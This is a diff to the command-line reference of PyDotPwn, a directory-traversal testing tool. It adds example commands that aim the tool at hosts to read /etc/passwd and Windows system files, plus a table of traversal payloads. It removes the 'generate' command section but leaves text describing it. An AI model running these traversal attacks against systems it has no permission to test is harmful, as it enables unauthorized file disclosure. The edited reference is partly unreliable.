@@ -19,6 +19,32 @@ This is the comprehensive command-line interface reference for PyDotPwn. Every p
 - [Performance Tuning](#performance-tuning)
 - [Examples by Use Case](#examples-by-use-case)
 
+## � Revolutionary Path Validation Bypass
+
+PyDotPwn includes the **industry's first comprehensive path validation bypass capability**, generating over **25,000 specialized patterns** designed to bypass modern application security controls.
+
+### Quick Start Examples
+
+```bash
+# Generate all 25,000+ path validation bypass patterns
+python dotdotpwn.py main --module stdout --os-type unix --file "/etc/passwd" --depth 3
+
+# Test web application with path validation bypass
+python dotdotpwn.py main --module http --host target.com --file /etc/passwd --depth 5
+
+# Windows path validation bypass
+python dotdotpwn.py main --module http --host windows.com --file "C:\Windows\System32\drivers\etc\hosts" --depth 4
+```
+
+### Pattern Coverage
+
+| Pattern Type | Count | Example |
+|--------------|-------|---------|
+| **Path Validation Bypass** | 25,000+ | `/var/www/uploads/../../../etc/passwd` |
+| **Absolute Path Patterns** | 144+ | `/etc/passwd`, `%2fetc%2fpasswd` |
+| **Relative Traversal** | 1,778+ | `../../../etc/passwd` |
+| **Total Patterns** | **25,000+** | **1,305% increase over original** |
+
 ## 🏗️ Command Structure
 
 PyDotPwn uses a modern CLI structure with multiple command modes:
@@ -26,28 +52,16 @@ PyDotPwn uses a modern CLI structure with multiple command modes:
 ### Main Scanning Commands
 
 ```bash
-# Primary scanning interface
+# Primary scanning interface with path validation bypass
 python dotdotpwn.py main [OPTIONS]
 
-# Pattern generation mode (NEW!)
-python dotdotpwn.py generate [OPTIONS]
-
-# API server mode
-python dotdotpwn.py api [OPTIONS]
+# Legacy compatibility mode
+python dotdotpwn.py [OPTIONS]
 
 # Help and examples
 python dotdotpwn.py help-examples
 python dotdotpwn.py help-modules
 ```
-
-### Legacy Compatibility
-
-```bash
-# Direct execution (maintains compatibility)
-python dotdotpwn.py [OPTIONS]
-```
-
-## 🆕 Generate Command - Pattern Generation
 
 The `generate` command is a powerful new feature that creates traversal patterns without performing actual scans. Perfect for testing, integration, and custom payloads.
 
